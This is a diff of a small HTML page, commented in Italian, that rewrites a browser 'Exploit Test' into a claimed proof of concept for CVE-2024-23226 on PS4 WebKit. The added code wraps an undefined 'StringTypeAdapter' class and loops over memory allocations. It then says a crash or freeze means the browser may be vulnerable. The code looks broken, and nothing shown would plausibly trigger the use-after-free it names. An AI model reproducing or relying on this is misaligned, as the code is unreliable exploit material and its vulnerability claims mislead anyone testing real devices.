@@ -1,37 +1,38 @@
 <!DOCTYPE html>
-<html lang="it">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exploit Test</title>
+    <title>PoC CVE-2024-23226 - PS4 WebKit Test</title>
     <script>
-        function sleepSeconds(seconds) {
-            return new Promise(resolve => setTimeout(resolve, seconds * 1000));
+        function gc() {
+            for (let i = 0; i < 50; i++) {
+                let a = new Uint8Array(1024 * 10); // 10 KB per iterazione
+            }
         }
 
-        async function exploit() {
-            alert("Inizio exploit...");
-
-            const v1 = [-1n];
-            let v2;
-
+        function triggerUAF() {
             try {
-                alert("Usando toReversed() per v1");
-                v2 = v1.toReversed(); 
+                class FakeAdapter {
+                    constructor(str) {
+                        this.adapter = new StringTypeAdapter(str);
+                    }
+                }
 
-                alert("Descrizione di v2: " + JSON.stringify(v2));
-                await sleepSeconds(5);
-                alert("Accesso a v2[2]: " + (v2[2]?.toString() || "undefined"));
+                let testStr = "AAAAAAAAAAAAAAAAAAAA";
+                let adapter1 = new FakeAdapter(testStr);
+                let adapter2 = new FakeAdapter(testStr);
+
+                // Forza un leggero disturbo nella memoria per aiutare il trigger del UAF
+                gc();
+
+                alert("Se il browser crasha o si blocca, potrebbe essere vulnerabile!");
             } catch (e) {
                 alert("Errore: " + e.message);
             }
-
-            alert("Exploit completato!");
         }
     </script>
 </head>
 <body>
-    <h1>Exploit Test</h1>
-    <button onclick="exploit()">Esegui Exploit</button>
+    <h1>PoC CVE-2024-23226 - Test su PS4</h1>
+    <button onclick="triggerUAF()">Testa la vulnerabilità</button>
 </body>
 </html>
